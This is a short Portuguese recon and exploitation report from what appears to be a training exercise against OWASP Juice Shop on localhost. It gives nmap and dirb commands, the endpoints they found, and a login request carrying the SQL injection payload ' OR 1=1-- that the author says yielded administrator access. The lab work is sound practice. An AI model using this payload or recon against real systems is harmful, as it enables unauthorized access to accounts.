# Relatório de Reconhecimento e Análise - OWASP Juice Shop (Bloco 2)

## 1. Visão Geral
Este relatório detalha os achados da fase de reconhecimento e interceptação de tráfego realizada na aplicação OWASP Juice Shop, focando na descoberta de endpoints ocultos e identificação de privilégios de administradores.
## 2. Reconhecimento com NMAP e DIRB:
utilizando o NMAP encontrei as seguintes portas abertas:
3000/tcp open ppp?
8080/tcp open http-proxy
PORTAS ABERTAS! Rodando aplicação
Comando utilzado no Nmap:
## nmap -sV localhost
Utiizando o DIRB encontrei os seguintes endpoints:
/robots.txt	200
/ftp/	200	
/.well-known/security.txt	200
/assets/	200	
/main.js, /polyfills.js, /vendor.js, /runtime.js	200
/encryptionkeys/	200	
/rest/	200/401	
/api/Users	401	
/media/, /favicon.ico	200
Comando utilizando no kali linux:
## dirb http://localhost:3000 /usr/share/dirb/wordlists/big.txt -o dirb_juice.txt

## 3. Usando SQL INJECTION e Burp Suite:
Descobri uma requisição no burpsuite de login:
POST /rest/user/login HTTP/1.1
Host: <ALVO>:3000
Content-Type: application/json

{"email":"a","password":"a"}

Pelo visto podemos usar SQL INJECTION utilizando ' OR 1=1--
no formulario de login e talvez ganhar acesso a algum login

{"email":"' OR 1=1--","password":"a"}

consegui acesso ao administrador 
